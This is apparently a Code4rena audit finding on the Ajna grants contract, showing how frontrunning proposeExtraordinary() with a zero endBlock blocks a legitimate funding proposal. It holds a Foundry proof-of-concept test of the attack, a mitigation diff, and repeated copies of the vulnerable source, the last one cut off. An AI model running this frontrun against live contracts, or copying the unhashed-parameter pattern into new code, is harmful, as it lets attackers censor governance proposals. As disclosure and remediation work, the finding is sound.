{
  "Title": "[M-09] Adversary can prevent the creation of any extraordinary funding proposal by frontrunning `proposeExtraordinary()`",
  "Content": "\nA griefing attack can be conducted to prevent the creation of any extraordinary funding proposal, or targetting specific receivers.\n\nThe cost of performing the attack is low, only involving the gas payment for the transaction.\n\n### Proof of Concept\n\n`ExtraordinaryFunding::proposeExtraordinary()` hashes all its inputs except for `endBlock_` when creating the `proposalId`:\n\n```solidity\n    function proposeExtraordinary(\n        uint256 endBlock_,\n        address[] memory targets_,\n        uint256[] memory values_,\n        bytes[] memory calldatas_,\n        string memory description_) external override returns (uint256 proposalId_) {\n\n        proposalId_ = _hashProposal(targets_, values_, calldatas_, keccak256(abi.encode(DESCRIPTION_PREFIX_HASH_EXTRAORDINARY, keccak256(bytes(description_)))));\n```\n\n[Link to code](https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L85-L92)\n\nThis allows an adversary to frontrun the transaction, and create an exact proposal, but with an `endBlock` that will the proposal expire instantly, in a past block or whenever they want.\n\n```solidity\n        ExtraordinaryFundingProposal storage newProposal = _extraordinaryFundingProposals[proposalId_];\n        // ...\n        newProposal.endBlock        = SafeCast.toUint128(endBlock_);\n```\n\n[Link to code](https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L94)\n\nNobody will be able to vote via `ExtraordinaryFunding::voteExtraordinary`, as the transaction will revert because of `proposal.endBlock < block.number`:\n\n```solidity\n        if (proposal.startBlock > block.number || proposal.endBlock < block.number || proposal.executed) {\n            revert ExtraordinaryFundingProposalInactive();\n        }\n```\n\n[Link to code](https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L139-L141)\n\nWith no votes, the proposal can't be executed.\n\n### Coded Proof of Concept\n\nThis test demonstrates how an adversary can frontrun the creation of an extraordinary proposal with a value of `endBlock` that will the proposal \"end\" instantly, while preventing the intended proposal to be created.\n\nAdd this test to `ajna-grants/test/unit/ExtraordinaryFunding.t.sol` and run `forge test -m \"testProposeExtraordinary_Frontrun\"`:\n\n```solidity\n    function testProposeExtraordinary_Frontrun() external {\n        // The user that will try to propose the funding\n        changePrank(_tokenHolder1);\n\n        // 14 tokenholders self delegate their tokens to enable voting on the proposals\n        _selfDelegateVoters(_token, _votersArr);\n\n        vm.roll(_startBlock + 100);\n\n        // set proposal params\n        uint256 endBlockParam = block.number + 100_000;\n        uint256 tokensRequestedParam = 50_000_000 * 1e18;\n\n        // generate proposal targets\n        address[] memory targets = new address[](1);\n        targets[0] = address(_token);\n\n        // generate proposal values\n        uint256[] memory values = new uint256[](1);\n        values[0] = 0;\n\n        // generate proposal calldata\n        bytes[] memory calldatas = new bytes[](1);\n        calldatas[0] = abi.encodeWithSignature(\n            \"transfer(address,uint256)\",\n            _tokenHolder1,\n            tokensRequestedParam\n        );\n\n        /***********************************\n         *          ATTACK BEGINS          *\n         ***********************************/\n\n        // An attacker sees the proposal in the mempool and frontruns it.\n        // By setting an `endBlock_ == 0`, it will create a \"defeated\" proposal.\n        // So when the actual user tries to send the real proposal, that one will revert.\n        address attacker = makeAddr(\"attacker\");\n        changePrank(attacker);\n        uint256 pastEndBlockParam = 0; // @audit \n        uint256 proposalId = _grantFund.proposeExtraordinary(\n            pastEndBlockParam, targets, values, calldatas, \"Extraordinary Proposal for Ajna token transfer to tester address\"\n        );\n\n        // Verify that the proposal is created and has a `Defeated` state\n        IFunding.ProposalState proposalState = _grantFund.state(proposalId);\n        assertEq(uint8(proposalState), uint8(IFunding.ProposalState.Defeated));\n\n        /***********************************\n         *           ATTACK ENDS           *\n         ***********************************/\n\n        // When the user tries to send the proposal it will always revert.\n        // As a previous proposal with the same hash has been already sent, despite that having a malicious `endBlockParam`.\n        changePrank(_tokenHolder1);\n        vm.expectRevert(IFunding.ProposalAlreadyExists.selector);\n        _grantFund.proposeExtraordinary(\n            endBlockParam, targets, values, calldatas, \"Extraordinary Proposal for Ajna token transfer to tester address\"\n        );\n    }\n```\n\n### Recommended Mitigation Steps\n\nAdd `endBlock_` to the hash of the proposal. This way there will be no impact in frontrunning the transaction, as the expected proposal will be stored.\n\n```diff\n    function proposeExtraordinary(\n        uint256 endBlock_,\n        address[] memory targets_,\n        uint256[] memory values_,\n        bytes[] memory calldatas_,\n        string memory description_) external override returns (uint256 proposalId_) {\n\n-       proposalId_ = _hashProposal(targets_, values_, calldatas_, keccak256(abi.encode(DESCRIPTION_PREFIX_HASH_EXTRAORDINARY, keccak256(bytes(description_)))));\n+       proposalId_ = _hashProposal(endBlock_, targets_, values_, calldatas_, keccak256(abi.encode(DESCRIPTION_PREFIX_HASH_EXTRAORDINARY, keccak256(bytes(description_)))));\n```\n\n```diff\n    function executeExtraordinary(\n+       uint256 endBlock_,\n        address[] memory targets_,\n        uint256[] memory values_,\n        bytes[] memory calldatas_,\n        bytes32 descriptionHash_\n    ) external nonReentrant override returns (uint256 proposalId_) {\n-       proposalId_ = _hashProposal(targets_, values_, calldatas_, keccak256(abi.encode(DESCRIPTION_PREFIX_HASH_EXTRAORDINARY, descriptionHash_)));\n+       proposalId_ = _hashProposal(endBlock_, targets_, values_, calldatas_, keccak256(abi.encode(DESCRIPTION_PREFIX_HASH_EXTRAORDINARY, descriptionHash_)));\n```\n\n**[MikeHathaway (Ajna) confirmed](https://github.com/code-423n4/2023-05-ajna-findings/issues/260#issuecomment-1555118034)**\n\n\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/reports/2023-05-ajna",
  "Code": [
    {
      "filename": "ajna-grants/src/grants/base/ExtraordinaryFunding.sol",
      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity 0.8.16;\n\nimport { IERC20 }   from \"@oz/token/ERC20/IERC20.sol\";\nimport { SafeCast } from \"@oz/utils/math/SafeCast.sol\";\n\nimport { Funding } from \"./Funding.sol\";\n\nimport { IExtraordinaryFunding } from \"../interfaces/IExtraordinaryFunding.sol\";\n\nimport { Maths } from \"../libraries/Maths.sol\";\n\nabstract contract ExtraordinaryFunding is Funding, IExtraordinaryFunding {\n\n    /*****************/\n    /*** Constants ***/\n    /*****************/\n\n    /**\n     * @notice The maximum length of a proposal's voting period, in blocks.\n     */\n    uint256 internal constant MAX_EFM_PROPOSAL_LENGTH = 216_000; // number of blocks in one month\n\n    /**\n     * @notice Keccak hash of a prefix string for extraordinary funding mechanism\n     */\n    bytes32 internal constant DESCRIPTION_PREFIX_HASH_EXTRAORDINARY = keccak256(bytes(\"Extraordinary Funding: \"));\n\n    /***********************/\n    /*** State Variables ***/\n    /***********************/\n\n    /**\n     * @notice Mapping of extant extraordinary funding proposals.\n     * @dev proposalId => ExtraordinaryFundingProposal.\n     */\n    mapping (uint256 => ExtraordinaryFundingProposal) internal _extraordinaryFundingProposals;\n\n    /**\n     * @notice The list of extraordinary funding proposalIds that have been executed.\n     */\n    uint256[] internal _fundedExtraordinaryProposals;\n\n    /**\n     * @notice Mapping checking if a voter has voted on a given proposal.\n     * @dev proposalId => address => bool.\n     */\n    mapping(uint256 => mapping(address => bool)) public hasVotedExtraordinary;\n\n    /**************************/\n    /*** Proposal Functions ***/\n    /**************************/\n\n    /// @inheritdoc IExtraordinaryFunding\n    function executeExtraordinary(\n        address[] memory targets_,\n        uint256[] memory values_,\n        bytes[] memory calldatas_,\n        bytes32 descriptionHash_\n    ) external nonReentrant override returns (uint256 proposalId_) {\n        proposalId_ = _hashProposal(targets_, values_, calldatas_, keccak256(abi.encode(DESCRIPTION_PREFIX_HASH_EXTRAORDINARY, descriptionHash_)));\n\n        ExtraordinaryFundingProposal storage proposal = _extraordinaryFundingProposals[proposalId_];\n\n        // since we are casting from uint128 to uint256, we can safely assume that the value will not overflow\n        uint256 tokensRequested = uint256(proposal.tokensRequested);\n\n        // check proposal is succesful and hasn't already been executed\n        if (proposal.executed || !_extraordinaryProposalSucceeded(proposalId_, tokensRequested)) revert ExecuteExtraordinaryProposalInvalid();\n\n        _fundedExtraordinaryProposals.push(proposalId_);\n\n        // update proposal state\n        proposal.executed = true;\n\n        // update treasury\n        treasury -= tokensRequested;\n\n        // execute proposal's calldata\n        _execute(proposalId_, targets_, values_, calldatas_);\n    }\n\n    /// @inheritdoc IExtraordinaryFunding\n    function proposeExtraordinary(\n        uint256 endBlock_,\n        address[] memory targets_,\n        uint256[] memory values_,\n        bytes[] memory calldatas_,\n        string memory description_) external override returns (uint256 proposalId_) {\n\n        proposalId_ = _hashProposal(targets_, values_, calldatas_, keccak256(abi.encode(DESCRIPTION_PREFIX_HASH_EXTRAORDINARY, keccak256(bytes(description_)))));\n\n        ExtraordinaryFundingProposal storage newProposal = _extraordinaryFundingProposals[proposalId_];\n\n        // check if proposal already exists (proposal id not 0)\n        if (newProposal.proposalId != 0) revert ProposalAlreadyExists();\n\n        // check proposal length is within limits of 1 month maximum\n        if (block.number + MAX_EFM_PROPOSAL_LENGTH < endBlock_) revert InvalidProposal();\n\n        uint128 totalTokensRequested = _validateCallDatas(targets_, values_, calldatas_);\n\n        // check tokens requested are available for claiming from the treasury\n        if (uint256(totalTokensRequested) > _getSliceOfTreasury(Maths.WAD - _getMinimumThresholdPercentage())) revert InvalidProposal();\n\n        // store newly created proposal\n        newProposal.proposalId      = proposalId_;\n        newProposal.startBlock      = SafeCast.toUint128(block.number);\n        newProposal.endBlock        = SafeCast.toUint128(endBlock_);\n        newProposal.tokensRequested = totalTokensRequested;\n\n        emit ProposalCreated(\n            proposalId_,\n            msg.sender,\n            targets_,\n            values_,\n            new string[](targets_.length),\n            calldatas_,\n            block.number,\n            endBlock_,\n            description_\n        );\n    }\n\n    /************************/\n    /*** Voting Functions ***/\n    /************************/\n\n    /// @inheritdoc IExtraordinaryFunding\n    function voteExtraordinary(\n        uint256 proposalId_\n    ) external override returns (uint256 votesCast_) {\n        // revert if msg.sender already voted on proposal\n        if (hasVotedExtraordinary[proposalId_][msg.sender]) revert AlreadyVoted();\n\n        ExtraordinaryFundingProposal storage proposal = _extraordinaryFundingProposals[proposalId_];\n        // revert if proposal is inactive\n        if (proposal.startBlock > block.number || proposal.endBlock < block.number || proposal.executed) {\n            revert ExtraordinaryFundingProposalInactive();\n        }\n\n        // check voting power at snapshot block and update proposal votes\n        votesCast_ = _getVotesExtraordinary(msg.sender, proposalId_);\n        proposal.votesReceived += SafeCast.toUint120(votesCast_);\n\n        // record that voter has voted on this extraordinary funding proposal\n        hasVotedExtraordinary[proposalId_][msg.sender] = true;\n\n        emit VoteCast(\n            msg.sender,\n            proposalId_,\n            1,\n            votesCast_,\n            \"\"\n        );\n    }\n\n    /**\n     * @notice Check if a proposal for extraordinary funding has succeeded.\n     * @param  proposalId_ The ID of the proposal being checked.\n     * @return Boolean indicating whether the proposal has succeeded.\n     */\n    function _extraordinaryProposalSucceeded(\n        uint256 proposalId_,\n        uint256 tokensRequested_\n    ) internal view returns (bool) {\n        uint256 votesReceived          = uint256(_extraordinaryFundingProposals[proposalId_].votesReceived);\n        uint256 minThresholdPercentage = _getMinimumThresholdPercentage();\n\n        return\n            // succeeded if proposal's votes received doesn't exceed the minimum threshold required\n            (votesReceived >= tokensRequested_ + _getSliceOfNonTreasury(minThresholdPercentage))\n            &&\n            // succeeded if tokens requested are available for claiming from the treasury\n            (tokensRequested_ <= _getSliceOfTreasury(Maths.WAD - minThresholdPercentage))\n        ;\n    }\n\n    /********************************/\n    /*** Internal View Functions ****/\n    /********************************/\n\n    /**\n     * @notice Get the current ProposalState of a given proposal.\n     * @dev    Used by GrantFund.state() for analytics compatability purposes.\n     * @param  proposalId_ The ID of the proposal being checked.\n     * @return The proposals status in the ProposalState enum.\n     */\n    function _getExtraordinaryProposalState(uint256 proposalId_) internal view returns (ProposalState) {\n        ExtraordinaryFundingProposal memory proposal = _extraordinaryFundingProposals[proposalId_];\n\n        bool voteSucceeded = _extraordinaryProposalSucceeded(proposalId_, uint256(proposal.tokensRequested));\n\n        if (proposal.executed)                                        return ProposalState.Executed;\n        else if (proposal.endBlock >= block.number && !voteSucceeded) return ProposalState.Active;\n        else if (voteSucceeded)                                       return ProposalState.Succeeded;\n        else                                                          return ProposalState.Defeated;\n    }\n\n    /**\n     * @notice Get the minimum percentage of ajna tokens required for a proposal to pass.\n     * @dev    The minimum threshold increases according to the number of funded EFM proposals.\n     * @return The minimum threshold percentage, as a WAD.\n     */\n    function _getMinimumThresholdPercentage() internal view returns (uint256) {\n        // default minimum threshold is 50\n        if (_fundedExtraordinaryProposals.length == 0) {\n            return 0.5 * 1e18;\n        }\n        // minimum threshold increases according to the number of funded EFM proposals\n        else {\n            return 0.5 * 1e18 + (_fundedExtraordinaryProposals.length * (0.05 * 1e18));\n        }\n    }\n\n    /**\n     * @notice Get the number of ajna tokens equivalent to a given percentage.\n     * @param percentage_ The percentage of the Non treasury to retrieve, in WAD.\n     * @return The number of tokens, in WAD.\n     */\n    function _getSliceOfNonTreasury(\n        uint256 percentage_\n    ) internal view returns (uint256) {\n        uint256 totalAjnaSupply = IERC20(ajnaTokenAddress).totalSupply();\n        return Maths.wmul(totalAjnaSupply - treasury, percentage_);\n    }\n\n    /**\n     * @notice Get the number of ajna tokens equivalent to a given percentage.\n     * @param percentage_ The percentage of the treasury to retrieve, in WAD.\n     * @return The number of tokens, in WAD.\n     */\n    function _getSliceOfTreasury(\n        uint256 percentage_\n    ) internal view returns (uint256) {\n        return Maths.wmul(treasury, percentage_);\n    }\n\n    /**\n     * @notice Get the voting power available to a voter for a given proposal.\n     * @param  account_        The address of the voter to check.\n     * @param  proposalId_     The ID of the proposal being voted on.\n     * @return votes_          The number of votes available to be cast in voteExtraordinary.\n     */\n    function _getVotesExtraordinary(address account_, uint256 proposalId_) internal view returns (uint256 votes_) {\n        if (proposalId_ == 0) revert ExtraordinaryFundingProposalInactive();\n\n        uint256 startBlock = _extraordinaryFundingProposals[proposalId_].startBlock;\n\n        votes_ = _getVotesAtSnapshotBlocks(\n            account_,\n            startBlock - VOTING_POWER_SNAPSHOT_DELAY,\n            startBlock\n        );\n    }\n\n    /********************************/\n    /*** External View Functions ****/\n    /********************************/\n\n    /// @inheritdoc IExtraordinaryFunding\n    function getMinimumThresholdPercentage() external view returns (uint256) {\n        return _getMinimumThresholdPercentage();\n    }\n\n    /// @inheritdoc IExtraordinaryFunding\n    function getSliceOfNonTreasury(\n        uint256 percentage_\n    ) external view override returns (uint256) {\n        return _getSliceOfNonTreasury(percentage_);\n    }\n\n    /// @inheritdoc IExtraordinaryFunding\n    function getSliceOfTreasury(\n        uint256 percentage_\n    ) external view override returns (uint256) {\n        return _getSliceOfTreasury(percentage_);\n    }\n\n    /// @inheritdoc IExtraordinaryFunding\n    function getExtraordinaryProposalInfo(\n        uint256 proposalId_\n    ) external view override returns (uint256, uint128, uint128, uint128, uint120, bool) {\n        return (\n            _extraordinaryFundingProposals[proposalId_].proposalId,\n            _extraordinaryFundingProposals[proposalId_].startBlock,\n            _extraordinaryFundingProposals[proposalId_].endBlock,\n            _extraordinaryFundingProposals[proposalId_].tokensRequested,\n            _extraordinaryFundingProposals[proposalId_].votesReceived,\n            _extraordinaryFundingProposals[proposalId_].executed\n        );\n    }\n\n    /// @inheritdoc IExtraordinaryFunding\n    function getExtraordinaryProposalSucceeded(uint256 proposalId_) external view override returns (bool) {\n        // since we are casting from uint128 to uint256, we can safely assume that the value will not overflow\n        uint256 tokensRequested = uint256(_extraordinaryFundingProposals[proposalId_].tokensRequested);\n\n        return _extraordinaryProposalSucceeded(proposalId_, tokensRequested);\n    }\n\n    /// @inheritdoc IExtraordinaryFunding\n    function getVotesExtraordinary(address account_, uint256 proposalId_) external view override returns (uint256) {\n        if (hasVotedExtraordinary[proposalId_][account_]) return 0;\n        return _getVotesExtraordinary(account_, proposalId_);\n    }\n\n}"
    },
    {
      "filename": "ajna-grants/src/grants/base/ExtraordinaryFunding.sol",
      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity 0.8.16;\n\nimport { IERC20 }   from \"@oz/token/ERC20/IERC20.sol\";\nimport { SafeCast } from \"@oz/utils/math/SafeCast.sol\";\n\nimport { Funding } from \"./Funding.sol\";\n\nimport { IExtraordinaryFunding } from \"../interfaces/IExtraordinaryFunding.sol\";\n\nimport { Maths } from \"../libraries/Maths.sol\";\n\nabstract contract ExtraordinaryFunding is Funding, IExtraordinaryFunding {\n\n    /*****************/\n    /*** Constants ***/\n    /*****************/\n\n    /**\n     * @notice The maximum length of a proposal's voting period, in blocks.\n     */\n    uint256 internal constant MAX_EFM_PROPOSAL_LENGTH = 216_000; // number of blocks in one month\n\n    /**\n     * @notice Keccak hash of a prefix string for extraordinary funding mechanism\n     */\n    bytes32 internal constant DESCRIPTION_PREFIX_HASH_EXTRAORDINARY = keccak256(bytes(\"Extraordinary Funding: \"));\n\n    /***********************/\n    /*** State Variables ***/\n    /***********************/\n\n    /**\n     * @notice Mapping of extant extraordinary funding proposals.\n     * @dev proposalId => ExtraordinaryFundingProposal.\n     */\n    mapping (uint256 => ExtraordinaryFundingProposal) internal _extraordinaryFundingProposals;\n\n    /**\n     * @notice The list of extraordinary funding proposalIds that have been executed.\n     */\n    uint256[] internal _fundedExtraordinaryProposals;\n\n    /**\n     * @notice Mapping checking if a voter has voted on a given proposal.\n     * @dev proposalId => address => bool.\n     */\n    mapping(uint256 => mapping(address => bool)) public hasVotedExtraordinary;\n\n    /**************************/\n    /*** Proposal Functions ***/\n    /**************************/\n\n    /// @inheritdoc IExtraordinaryFunding\n    function executeExtraordinary(\n        address[] memory targets_,\n        uint256[] memory values_,\n        bytes[] memory calldatas_,\n        bytes32 descriptionHash_\n    ) external nonReentrant override returns (uint256 proposalId_) {\n        proposalId_ = _hashProposal(targets_, values_, calldatas_, keccak256(abi.encode(DESCRIPTION_PREFIX_HASH_EXTRAORDINARY, descriptionHash_)));\n\n        ExtraordinaryFundingProposal storage proposal = _extraordinaryFundingProposals[proposalId_];\n\n        // since we are casting from uint128 to uint256, we can safely assume that the value will not overflow\n        uint256 tokensRequested = uint256(proposal.tokensRequested);\n\n        // check proposal is succesful and hasn't already been executed\n        if (proposal.executed || !_extraordinaryProposalSucceeded(proposalId_, tokensRequested)) revert ExecuteExtraordinaryProposalInvalid();\n\n        _fundedExtraordinaryProposals.push(proposalId_);\n\n        // update proposal state\n        proposal.executed = true;\n\n        // update treasury\n        treasury -= tokensRequested;\n\n        // execute proposal's calldata\n        _execute(proposalId_, targets_, values_, calldatas_);\n    }\n\n    /// @inheritdoc IExtraordinaryFunding\n    function proposeExtraordinary(\n        uint256 endBlock_,\n        address[] memory targets_,\n        uint256[] memory values_,\n        bytes[] memory calldatas_,\n        string memory description_) external override returns (uint256 proposalId_) {\n\n        proposalId_ = _hashProposal(targets_, values_, calldatas_, keccak256(abi.encode(DESCRIPTION_PREFIX_HASH_EXTRAORDINARY, keccak256(bytes(description_)))));\n\n        ExtraordinaryFundingProposal storage newProposal = _extraordinaryFundingProposals[proposalId_];\n\n        // check if proposal already exists (proposal id not 0)\n        if (newProposal.proposalId != 0) revert ProposalAlreadyExists();\n\n        // check proposal length is within limits of 1 month maximum\n        if (block.number + MAX_EFM_PROPOSAL_LENGTH < endBlock_) revert InvalidProposal();\n\n        uint128 totalTokensRequested = _validateCallDatas(targets_, values_, calldatas_);\n\n        // check tokens requested are available for claiming from the treasury\n        if (uint256(totalTokensRequested) > _getSliceOfTreasury(Maths.WAD - _getMinimumThresholdPercentage())) revert InvalidProposal();\n\n        // store newly created proposal\n        newProposal.proposalId      = proposalId_;\n        newProposal.startBlock      = SafeCast.toUint128(block.number);\n        newProposal.endBlock        = SafeCast.toUint128(endBlock_);\n        newProposal.tokensRequested = totalTokensRequested;\n\n        emit ProposalCreated(\n            proposalId_,\n            msg.sender,\n            targets_,\n            values_,\n            new string[](targets_.length),\n            calldatas_,\n            block.number,\n            endBlock_,\n            description_\n        );\n    }\n\n    /************************/\n    /*** Voting Functions ***/\n    /************************/\n\n    /// @inheritdoc IExtraordinaryFunding\n    function voteExtraordinary(\n        uint256 proposalId_\n    ) external override returns (uint256 votesCast_) {\n        // revert if msg.sender already voted on proposal\n        if (hasVotedExtraordinary[proposalId_][msg.sender]) revert AlreadyVoted();\n\n        ExtraordinaryFundingProposal storage proposal = _extraordinaryFundingProposals[proposalId_];\n        // revert if proposal is inactive\n        if (proposal.startBlock > block.number || proposal.endBlock < block.number || proposal.executed) {\n            revert ExtraordinaryFundingProposalInactive();\n        }\n\n        // check voting power at snapshot block and update proposal votes\n        votesCast_ = _getVotesExtraordinary(msg.sender, proposalId_);\n        proposal.votesReceived += SafeCast.toUint120(votesCast_);\n\n        // record that voter has voted on this extraordinary funding proposal\n        hasVotedExtraordinary[proposalId_][msg.sender] = true;\n\n        emit VoteCast(\n            msg.sender,\n            proposalId_,\n            1,\n            votesCast_,\n            \"\"\n        );\n    }\n\n    /**\n     * @notice Check if a proposal for extraordinary funding has succeeded.\n     * @param  proposalId_ The ID of the proposal being checked.\n     * @return Boolean indicating whether the proposal has succeeded.\n     */\n    function _extraordinaryProposalSucceeded(\n        uint256 proposalId_,\n        uint256 tokensRequested_\n    ) internal view returns (bool) {\n        uint256 votesReceived          = uint256(_extraordinaryFundingProposals[proposalId_].votesReceived);\n        uint256 minThresholdPercentage = _getMinimumThresholdPercentage();\n\n        return\n            // succeeded if proposal's votes received doesn't exceed the minimum threshold required\n            (votesReceived >= tokensRequested_ + _getSliceOfNonTreasury(minThresholdPercentage))\n            &&\n            // succeeded if tokens requested are available for claiming from the treasury\n            (tokensRequested_ <= _getSliceOfTreasury(Maths.WAD - minThresholdPercentage))\n        ;\n    }\n\n    /********************************/\n    /*** Internal View Functions ****/\n    /********************************/\n\n    /**\n     * @notice Get the current ProposalState of a given proposal.\n     * @dev    Used by GrantFund.state() for analytics compatability purposes.\n     * @param  proposalId_ The ID of the proposal being checked.\n     * @return The proposals status in the ProposalState enum.\n     */\n    function _getExtraordinaryProposalState(uint256 proposalId_) internal view returns (ProposalState) {\n        ExtraordinaryFundingProposal memory proposal = _extraordinaryFundingProposals[proposalId_];\n\n        bool voteSucceeded = _extraordinaryProposalSucceeded(proposalId_, uint256(proposal.tokensRequested));\n\n        if (proposal.executed)                                        return ProposalState.Executed;\n        else if (proposal.endBlock >= block.number && !voteSucceeded) return ProposalState.Active;\n        else if (voteSucceeded)                                       return ProposalState.Succeeded;\n        else                                                          return ProposalState.Defeated;\n    }\n\n    /**\n     * @notice Get the minimum percentage of ajna tokens required for a proposal to pass.\n     * @dev    The minimum threshold increases according to the number of funded EFM proposals.\n     * @return The minimum threshold percentage, as a WAD.\n     */\n    function _getMinimumThresholdPercentage() internal view returns (uint256) {\n        // default minimum threshold is 50\n        if (_fundedExtraordinaryProposals.length == 0) {\n            return 0.5 * 1e18;\n        }\n        // minimum threshold increases according to the number of funded EFM proposals\n        else {\n            return 0.5 * 1e18 + (_fundedExtraordinaryProposals.length * (0.05 * 1e18));\n        }\n    }\n\n    /**\n     * @notice Get the number of ajna tokens equivalent to a given percentage.\n     * @param percentage_ The percentage of the Non treasury to retrieve, in WAD.\n     * @return The number of tokens, in WAD.\n     */\n    function _getSliceOfNonTreasury(\n        uint256 percentage_\n    ) internal view returns (uint256) {\n        uint256 totalAjnaSupply = IERC20(ajnaTokenAddress).totalSupply();\n        return Maths.wmul(totalAjnaSupply - treasury, percentage_);\n    }\n\n    /**\n     * @notice Get the number of ajna tokens equivalent to a given percentage.\n     * @param percentage_ The percentage of the treasury to retrieve, in WAD.\n     * @return The number of tokens, in WAD.\n     */\n    function _getSliceOfTreasury(\n        uint256 percentage_\n    ) internal view returns (uint256) {\n        return Maths.wmul(treasury, percentage_);\n    }\n\n    /**\n     * @notice Get the voting power available to a voter for a given proposal.\n     * @param  account_        The address of the voter to check.\n     * @param  proposalId_     The ID of the proposal being voted on.\n     * @return votes_          The number of votes available to be cast in voteExtraordinary.\n     */\n    function _getVotesExtraordinary(address account_, uint256 proposalId_) internal view returns (uint256 votes_) {\n        if (proposalId_ == 0) revert ExtraordinaryFundingProposalInactive();\n\n        uint256 startBlock = _extraordinaryFundingProposals[proposalId_].startBlock;\n\n        votes_ = _getVotesAtSnapshotBlocks(\n            account_,\n            startBlock - VOTING_POWER_SNAPSHOT_DELAY,\n            startBlock\n        );\n    }\n\n    /********************************/\n    /*** External View Functions ****/\n    /********************************/\n\n    /// @inheritdoc IExtraordinaryFunding\n    function getMinimumThresholdPercentage() external view returns (uint256) {\n        return _getMinimumThresholdPercentage();\n    }\n\n    /// @inheritdoc IExtraordinaryFunding\n    function getSliceOfNonTreasury(\n        uint256 percentage_\n    ) external view override returns (uint256) {\n        return _getSliceOfNonTreasury(percentage_);\n    }\n\n    /// @inheritdoc IExtraordinaryFunding\n    function getSliceOfTreasury(\n        uint256 percentage_\n    ) external view override returns (uint256) {\n        return _getSliceOfTreasury(percentage_);\n    }\n\n    /// @inheritdoc IExtraordinaryFunding\n    function getExtraordinaryProposalInfo(\n        uint256 proposalId_\n    ) external view override returns (uint256, uint128, uint128, uint128, uint120, bool) {\n        return (\n            _extraordinaryFundingProposals[proposalId_].proposalId,\n            _extraordinaryFundingProposals[proposalId_].startBlock,\n            _extraordinaryFundingProposals[proposalId_].endBlock,\n            _extraordinaryFundingProposals[proposalId_].tokensRequested,\n            _extraordinaryFundingProposals[proposalId_].votesReceived,\n            _extraordinaryFundingProposals[proposalId_].executed\n        );\n    }\n\n    /// @inheritdoc IExtraordinaryFunding\n    function getExtraordinaryProposalSucceeded(uint256 proposalId_) external view override returns (bool) {\n        // since we are casting from uint128 to uint256, we can safely assume that the value will not overflow\n        uint256 tokensRequested = uint256(_extraordinaryFundingProposals[proposalId_].tokensRequested);\n\n        return _extraordinaryProposalSucceeded(proposalId_, tokensRequested);\n    }\n\n    /// @inheritdoc IExtraordinaryFunding\n    function getVotesExtraordinary(address account_, uint256 proposalId_) external view override returns (uint256) {\n        if (hasVotedExtraordinary[proposalId_][account_]) return 0;\n        return _getVotesExtraordinary(account_, proposalId_);\n    }\n\n}"
    },
    {
      "filename": "ajna-grants/src/grants/base/ExtraordinaryFunding.sol",
      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity 0.8.16;\n\nimport { IERC20 }   from \"@oz/token/ERC20/IERC20.sol\";\nimport { SafeCast } from \"@oz/utils/math/SafeCast.sol\";\n\nimport { Funding } from \"./Funding.sol\";\n\nimport { IExtraordinaryFunding } from \"../interfaces/IExtraordinaryFunding.sol\";\n\nimport { Maths } from \"../libraries/Maths.sol\";\n\nabstract contract ExtraordinaryFunding is Funding, IExtraordinaryFunding {\n\n    /*****************/\n    /*** Constants ***/\n    /*****************/\n\n    /**\n     * @notice The maximum length of a proposal's voting period, in blocks.\n     */\n    uint256 internal constant MAX_EFM_PROPOSAL_LENGTH = 216_000; // number of blocks in one month\n\n    /**\n     * @notice Keccak hash of a prefix string for extraordinary funding mechanism\n     */\n    bytes32 internal constant DESCRIPTION_PREFIX_HASH_EXTRAORDINARY = keccak256(bytes(\"Extraordinary Funding: \"));\n\n    /***********************/\n    /*** State Variables ***/\n    /***********************/\n\n    /**\n     * @notice Mapping of extant extraordinary funding proposals.\n     * @dev proposalId => ExtraordinaryFundingProposal.\n     */\n    mapping (uint256 => ExtraordinaryFundingProposal) internal _extraordinaryFundingProposals;\n\n    /**\n     * @notice The list of extraordinary funding proposalIds that have been executed.\n     */\n    uint256[] internal _fundedExtraordinaryProposals;\n\n    /**\n     * @notice Mapping checking if a voter has voted on a given proposal.\n     * @dev proposalId => address => bool.\n     */\n    mapping(uint256 => mapping(address => bool)) public hasVotedExtraordinary;\n\n    /**************************/\n    /*** Proposal Functions ***/\n    /**************************/\n\n    /// @inheritdoc IExtraordinaryFunding\n    function executeExtraordinary(\n        address[] memory targets_,\n        uint256[] memory values_,\n        bytes[] memory calldatas_,\n        bytes32 descriptionHash_\n    ) external nonReentrant override returns (uint256 proposalId_) {\n        proposalId_ = _hashProposal(targets_, values_, calldatas_, keccak256(abi.encode(DESCRIPTION_PREFIX_HASH_EXTRAORDINARY, descriptionHash_)));\n\n        ExtraordinaryFundingProposal storage proposal = _extraordinaryFundingProposals[proposalId_];\n\n        // since we are casting from uint128 to uint256, we can safely assume that the value will not overflow\n        uint256 tokensRequested = uint256(proposal.tokensRequested);\n\n        // check proposal is succesful and hasn't already been executed\n        if (proposal.executed || !_extraordinaryProposalSucceeded(proposalId_, tokensRequested)) revert ExecuteExtraordinaryProposalInvalid();\n\n        _fundedExtraordinaryProposals.push(proposalId_);\n\n        // update proposal state\n        proposal.executed = true;\n\n        // update treasury\n        treasury -= tokensRequested;\n\n        // execute proposal's calldata\n        _execute(proposalId_, targets_, values_, calldatas_);\n    }\n\n    /// @inheritdoc IExtraordinaryFunding\n    function proposeExtraordinary(\n        uint256 endBlock_,\n        address[] memory targets_,\n        uint256[] memory values_,\n        bytes[] memory calldatas_,\n        string memory description_) external override returns (uint256 proposalId_) {\n\n        proposalId_ = _hashProposal(targets_, values_, calldatas_, keccak256(abi.encode(DESCRIPTION_PREFIX_HASH_EXTRAORDINARY, keccak256(bytes(description_)))));\n\n        ExtraordinaryFundingProposal storage newProposal = _extraordinaryFundingProposals[proposalId_];\n\n        // check if proposal already exists (proposal id not 0)\n        if (newProposal.proposalId != 0) revert ProposalAlreadyExists();\n\n        // check proposal length is within limits of 1 month maximum\n        if (block.number + MAX_EFM_PROPOSAL_LENGTH < endBlock_) revert InvalidProposal();\n\n        uint128 totalTokensRequested = _validateCallDatas(targets_, values_, calldatas_);\n\n        // check tokens requested are available for claiming from the treasury\n        if (uint256(totalTokensRequested) > _getSliceOfTreasury(Maths.WAD - 